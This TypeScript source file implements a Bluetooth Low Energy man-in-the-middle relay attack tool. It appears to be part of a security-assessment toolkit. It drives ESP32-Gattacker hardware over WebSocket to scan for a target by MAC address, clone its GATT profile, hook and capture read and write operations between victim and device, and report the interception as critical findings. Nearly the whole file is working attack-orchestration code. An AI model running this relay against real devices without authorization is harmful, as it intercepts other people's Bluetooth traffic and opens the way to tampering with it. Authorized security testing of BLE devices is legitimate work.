/**
 * mitm-relay.ts — BLE MITM/relay attack via ESP32-Gattacker (Flow 3.4)
 *
 * Connects to ESP32-Gattacker over WebSocket, orchestrates device scanning,
 * GATT cloning, and man-in-the-middle relay with optional read/write hook
 * interception.
 * Online: requires ESP32-Gattacker hardware (ESP32-S3) on WiFi
 */

import { z } from 'zod';
import { fileURLToPath } from 'node:url';
import { BleMacAddressSchema, estimateTokens } from './lib/types.js';

export const mitmRelayParams = z.object({
  target_mac: BleMacAddressSchema,
  gattacker_url: z.string().default('ws://1.3.3.7/ws'),
  enable_hooks: z.boolean().default(true),
  hook_timeout_ms: z.number().min(100).max(30000).default(5000),
  capture_duration_seconds: z.number().min(0).max(3600).default(60),
});
export type MitmRelayInput = z.infer<typeof mitmRelayParams>;

/**
 * Abstraction over the Gattacker WebSocket connection.
 * In tests, provide a mock; in production, a real WebSocket client.
 */
export interface IGattackerClient {
  send(msg: Record<string, unknown>): void;
  onMessage(handler: (msg: Record<string, unknown>) => void): void;
  close(): void;
}

interface CapturedOperation {
  timestamp: string;
  type: 'read' | 'write';
  uuid: string;
  value_hex: string;
  hooked: boolean;
  modified_value_hex?: string;
}

export const mitmRelay = {
  name: 'caeruleus.mitm_relay',
  description:
    'Perform BLE MITM relay attack using ESP32-Gattacker. Clones target GATT profile, intercepts read/write operations between victim and target device.',
  parameters: mitmRelayParams,

  async execute(
    input: MitmRelayInput,
    wsClient?: IGattackerClient,
  ): Promise<Record<string, unknown>> {
    const validated = mitmRelayParams.parse(input);
    const findings: Array<Record<string, unknown>> = [];
    const capturedOps: CapturedOperation[] = [];
    const stateLog: Array<Record<string, unknown>> = [];

    // Create WebSocket client
    const client = wsClient ?? (await createWsClient(validated.gattacker_url));

    // Set up message handling
    const messageQueue: Array<Record<string, unknown>> = [];
    let messageResolver: ((msg: Record<string, unknown>) => void) | null = null;

    client.onMessage((msg) => {
      // Handle hook events (read/write interception)
      if (msg.onWrite || msg.onRead) {
        const op: CapturedOperation = {
          timestamp: new Date().toISOString(),
          type: msg.onWrite ? 'write' : 'read',
          uuid: msg.uuid as string,
          value_hex: msg.value as string,
          hooked: validated.enable_hooks,
        };
        capturedOps.push(op);

        // Pass through original value (no modification)
        client.send({
          opt: 2,
          action: 'hookret',
          hook_ret: msg.value as string,
        });
        return;
      }

      // Queue state/result messages
      if (messageResolver) {
        messageResolver(msg);
        messageResolver = null;
      } else {
        messageQueue.push(msg);
      }
    });

    function waitForMessage(
      predicate: (msg: Record<string, unknown>) => boolean,
      timeoutMs: number,
    ): Promise<Record<string, unknown>> {
      // Check queued messages first
      const idx = messageQueue.findIndex(predicate);
      if (idx >= 0) {
        return Promise.resolve(messageQueue.splice(idx, 1)[0]);
      }

      return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          messageResolver = null;
          reject(new Error('Gattacker response timeout'));
        }, timeoutMs);

        const originalResolver = messageResolver;
        const checkMsg = (msg: Record<string, unknown>) => {
          if (predicate(msg)) {
            clearTimeout(timer);
            resolve(msg);
          } else {
            messageQueue.push(msg);
            messageResolver = checkMsg;
          }
        };
        messageResolver = checkMsg;
      });
    }

    try {
      // Step 1: Check status
      client.send({ opt: 2, action: 'status' });
      const status = await waitForMessage(
        (m) => 'state' in m,
        5000,
      );
      stateLog.push({ step: 'status', state: status.state });

      // Step 2: Scan for devices
      client.send({ opt: 2, action: 'scan' });
      await waitForMessage(
        (m) => m.scan_done === true,
        15000,
      );
      stateLog.push({ step: 'scan_complete' });

      // Step 3: Get scan results
      client.send({ opt: 2, action: 'results' });
      const resultsMsg = await waitForMessage(
        (m) => 'results' in m,
        5000,
      );
      const devices = (resultsMsg.results || []) as Array<Record<string, unknown>>;
      stateLog.push({ step: 'results', device_count: devices.length });

      // Step 4: Find target device
      const target = devices.find(
        (d) =>
          (d.mac as string).toUpperCase() === validated.target_mac.toUpperCase(),
      );

      if (!target) {
        findings.push({
          finding_id: 'F-atk-mitm-target-not-found',
          type: 'mitm_target_not_found',
          severity: 'informational',
          description: `Target ${validated.target_mac} not found in Gattacker scan`,
        });

        const result = {
          schema_version: '1.0',
          target_mac: validated.target_mac,
          target_found: false,
          attack_started: false,
          scanned_devices: devices,
          captured_operations: [],
          state_log: stateLog,
          findings,
          findings_count: findings.length,
          estimatedTokens: 0,
        };
        result.estimatedTokens = estimateTokens(result);
        return result;
      }

      // Step 5: Enable hooks if requested
      if (validated.enable_hooks) {
        client.send({ opt: 2, action: 'enable_hooks', enable: true });
        await waitForMessage((m) => 'hooks_enabled' in m, 5000);
        stateLog.push({ step: 'hooks_enabled' });
      }

      // Step 6: Start MITM attack
      client.send({
        opt: 2,
        action: 'start',
        mac: validated.target_mac,
      });
      const attackState = await waitForMessage(
        (m) => 'state' in m,
        10000,
      );
      stateLog.push({ step: 'attack_started', state: attackState.state });

      // Step 7: Capture for duration
      await new Promise((resolve) =>
        setTimeout(resolve, validated.capture_duration_seconds * 1000),
      );

      // Step 8: Stop attack
      client.send({ opt: 2, action: 'stop' });
      await waitForMessage(
        (m) => 'state' in m && m.state === 0,
        10000,
      );
      stateLog.push({ step: 'attack_stopped' });

      // Analyze captured operations
      if (capturedOps.length > 0) {
        // Check for unencrypted operations
        const writeOps = capturedOps.filter((o) => o.type === 'write');
        const readOps = capturedOps.filter((o) => o.type === 'read');

        findings.push({
          finding_id: 'F-atk-mitm-relay-success',
          type: 'mitm_relay_success',
          severity: 'critical',
          description: `Successfully relayed ${capturedOps.length} operations (${writeOps.length} writes, ${readOps.length} reads) between victim and target device`,
          total_operations: capturedOps.length,
          write_operations: writeOps.length,
          read_operations: readOps.length,
        });

        // Unique UUIDs intercepted
        const uniqueUuids = [...new Set(capturedOps.map((o) => o.uuid))];
        if (uniqueUuids.length > 0) {
          findings.push({
            finding_id: 'F-atk-mitm-intercepted-chars',
            type: 'mitm_intercepted_characteristics',
            severity: 'high',
            description: `Intercepted operations on ${uniqueUuids.length} unique characteristics during MITM relay`,
            affected_uuids: uniqueUuids,
          });
        }
      }
    } finally {
      client.close();
    }

    const result = {
      schema_version: '1.0',
      target_mac: validated.target_mac,
      target_found: true,
      attack_started: true,
      gattacker_url: validated.gattacker_url,
      hooks_enabled: validated.enable_hooks,
      capture_duration_seconds: validated.capture_duration_seconds,
      captured_operations: capturedOps,
      captured_operation_count: capturedOps.length,
      state_log: stateLog,
      findings,
      findings_count: findings.length,
      estimatedTokens: 0,
    };

    result.estimatedTokens = estimateTokens(result);
    return result;
  },
};

async function createWsClient(url: string): Promise<IGattackerClient> {
  // Dynamic import WebSocket (Node.js built-in since v21, or ws package)
  const { WebSocket } = await import('ws');
  const ws = new WebSocket(url);

  await new Promise<void>((resolve, reject) => {
    ws.on('open', resolve);
    ws.on('error', reject);
    setTimeout(() => reject(new Error('WebSocket connection timeout')), 10000);
  });

  let handler: ((msg: Record<string, unknown>) => void) | null = null;

  ws.on('message', (data: Buffer) => {
    try {
      const msg = JSON.parse(data.toString());
      if (handler) handler(msg);
    } catch {
      // Ignore non-JSON messages
    }
  });

  return {
    send(msg) {
      ws.send(JSON.stringify(msg));
    },
    onMessage(h) {
      handler = h;
    },
    close() {
      ws.close();
    },
  };
}

const isMain = process.argv[1] === fileURLToPath(import.meta.url);
if (isMain) {
  const input = JSON.parse(process.argv[2] ?? '{}');
  mitmRelay
    .execute(input)
    .then((r) => console.log(JSON.stringify(r, null, 2)))
    .catch((e: unknown) => {
      console.error(JSON.stringify({ error: (e as Error).message }, null, 2));
      process.exit(1);
    });
}
